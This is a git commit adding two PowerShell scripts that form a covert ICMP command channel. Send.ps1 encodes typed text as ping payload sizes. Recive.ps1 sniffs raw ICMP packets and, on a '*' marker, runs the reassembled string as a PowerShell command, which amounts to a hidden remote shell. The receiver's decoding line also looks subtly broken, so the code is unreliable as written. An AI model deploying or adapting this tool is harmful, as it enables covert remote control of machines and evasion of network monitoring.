6f5a30ff749aa134c61bcad535d462d56d563794
babagrill <105714284+yahbozo@users.noreply.github.com>
2022-09-11 20:07:53 +0800

    Add files via upload

---
+++ Recive.ps1
@@ -0,0 +1,26 @@
+﻿$Host.UI.RawUI.BackgroundColor = 'Black';cls
+
+$IP = (Get-NetIPAddress | Where-Object {$_.AddressState -eq "Preferred" -and $_.ValidLifetime -lt "24:00:00"}).IPAddress
+
+$ICMPSocket = New-Object System.Net.Sockets.Socket([Net.Sockets.AddressFamily]::InterNetwork,[Net.Sockets.SocketType]::Raw, [Net.Sockets.ProtocolType]::Icmp)
+$Address = New-Object system.net.IPEndPoint([system.net.IPAddress]::Parse($IP), 0) 
+$ICMPSocket.bind($Address)
+$ICMPSocket.IOControl([Net.Sockets.IOControlCode]::ReceiveAll, [BitConverter]::GetBytes(1), 0)
+$buffer = new-object byte[] $ICMPSocket.ReceiveBufferSize
+$String = [System.Collections.ArrayList]@()
+
+cls
+while($True){   
+$EncodedBuf = $ICMPSocket.Receive($buffer)-28;$DecodedBuf = [System.Text.Encoding]::ASCII.GetString($EncodedBuf);
+
+if($DecodedBuf -eq "*"){$fullstr=$String -join '';powershell -command "$fullstr";$String = [System.Collections.ArrayList]@();$DecodedBuf= ''}
+
+if($DecodedBuf -eq "-"){$fullstr=$String -join '';write-host $fullstr;$String = [System.Collections.ArrayList]@();$DecodedBuf= ''}
+
+
+$String.Add($DecodedBuf) | out-null
+
+
+}
+
+exit
---
+++ Send.ps1
@@ -0,0 +1,20 @@
+﻿$ICMPClient = New-Object System.Net.NetworkInformation.Ping
+    $PingOptions = New-Object System.Net.NetworkInformation.PingOptions
+    $PingOptions.DontFragment = $True
+$Host.UI.RawUI.BackgroundColor = 'Black';cls
+$CIP = (Get-NetIPAddress | Where-Object {$_.AddressState -eq "Preferred" -and $_.ValidLifetime -lt "24:00:00"}).IPAddress
+Write-Host Your Current IP Is ' ' -nonewline;Write-Host $CIP -ForegroundColor red -BackgroundColor DarkBlue
+Write-Host ====Pevious Connected Hosts====
+
+
+$TP=Test-Path -Path $env:tmp\hosts.tmp
+if ($TP -eq 'True'){Get-Content $env:tmp\hosts.tmp} else {Write-Host No Previous Hosts Yet!;New-Item -Path $env:tmp\hosts.tmp -ItemType File}
+while($true){$IP = Read-Host -Prompt "Connected IP-ADDRESS";$TC=Test-Connection -BufferSize 32 -Count 1 -ComputerName $IP -Quiet;if ($TC -eq 'True'){Add-Content -Path $env:tmp\hosts.tmp -Value $IP;cls;break} else {;write-host Please Enter A Valid and Online Computer.;sleep 3;cls}}
+
+
+while($True){   
+$text = Read-Host -Prompt "["
+if($text -eq "clss"){cls;$text=' '}
+$txtn = ([text.encoding]::ASCII).GetBytes("$text-")
+foreach($EncodedTxt in $txtn){;ping -n 1 -l $EncodedTxt $IP | Out-Null}
+}
